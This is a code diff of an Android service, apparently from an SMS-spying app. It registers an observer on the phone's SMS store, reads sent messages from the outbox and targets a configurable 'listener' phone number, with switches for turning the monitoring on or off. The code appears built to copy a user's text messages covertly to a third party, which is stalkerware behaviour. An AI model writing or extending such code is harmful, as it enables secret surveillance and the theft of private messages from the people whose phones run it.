@@ -4,8 +4,9 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.List;
 
-import value.myValue;
+import value.getValueUtil;
 
+import android.annotation.SuppressLint;
 import android.app.PendingIntent;
 import android.app.Service;
 import android.content.ContentResolver;
@@ -23,11 +24,22 @@ import android.telephony.SmsManager;
 import com.main.MainActivity;
 
 public class SendSMSService extends Service {
-	public static final String tomyphone = myValue.sendMsgPhone;
+	public static String tomyphone;
 	@Override
 	public void onCreate() {
 		// TODO Auto-generated method stub
 		super.onCreate();
+		getValueUtil gvu = new getValueUtil();
+		tomyphone = gvu.getmyValueforListenerNumber(SendSMSService.this);
+		if(gvu.getmyValueforListenerYesOrNo(SendSMSService.this).equals("yes")){
+			if(gvu.getmyValueforSMSYesOrNo(SendSMSService.this).equals("yes")){
+				getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, new SmsObserver(new Handler()));
+			}else{
+				System.out.println("短信监听停止");
+			}
+		}else{
+			System.out.println("监听停止");
+		}
 	}
 	
 	private final class SmsObserver extends ContentObserver {
@@ -41,7 +53,8 @@ public class SendSMSService extends Service {
 	        super(handler);  
 	    }
 	  
-	    public void onChange(boolean selfChange) {
+	    @SuppressLint("SimpleDateFormat")
+		public void onChange(boolean selfChange) {
 	        ContentResolver resolver = getContentResolver();  
 	        //查到发出的短信  
 	        Uri uri = Uri.parse("content://sms/outbox");  
